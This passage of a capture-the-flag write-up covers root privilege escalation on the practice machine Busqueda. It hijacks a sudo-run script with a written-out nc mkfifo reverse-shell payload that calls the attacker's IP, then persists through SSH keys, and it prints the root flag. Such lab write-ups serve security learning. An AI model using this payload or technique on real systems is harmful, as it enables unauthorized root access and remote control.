script located in the current directory, and prints an error if it fails.

## Privilege escalation (Sudo permissions)

Since we can execute `/opt/scripts/system-checkup.py` as `root` and that the
`full-checkup` argument runs the `full-checkup.sh` script in the current
directory as `root`, we simply have to create a `full-checkup.sh` to execute it
as `root`!

### Preparation

The goal is to obtain a reverse shell.

First, I'll setup a listener to receive the shell.

```sh
❯ rlwrap nc -lvnp "9002"
```

Then, I'll choose the 'nc mkfifo' payload from
[RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
shell.

### Exploitation

Let's create a `full-checkup.sh` file int the current directory containing our
payload:

```sh
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 9002 >/tmp/f
```

Then, let's make it executable.

Finally, let's abuse our `sudo` permissions to execute it as `root`:

```sh
svc@busqueda:/tmp$ sudo "/usr/bin/python3" "/opt/scripts/system-checkup.py" "full-checkup"
```

If we check our listener:

```
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 36570
root@busqueda:/tmp#
```

It caught the reverse shell!

### Stabilizing the shell

Our home folder doesn't contain a `.ssh` folder, so I'll create one. Then I'll
create a private key and I'll add the corresponding key to `authorized_keys`.
Finally I'll connect over SSH to Busqueda. This way, I'll have a much more
stable shell.

## Getting a lay of the land

If we run `whoami`, we see that we're `root`!

### Flags

As usual, we can find the root flag in our home folder.

```sh
root@busqueda:~# cat "/root/root.txt"
```

```
f1ce7cfa47de5bc95bbbe023750c2a63
```

# Afterwords

![Success](success.png)

That's it for this box! 🎉

I rated the user flag as 'Very easy' and the root flag as 'Not too easy'. The
foothold was really easy to find and to exploit, it just required a bit of
reasearch. However, I found the privilege escalation much harder and longer, as
it was hard to identify and to find how to chain the information we gained.

Thanks for reading!
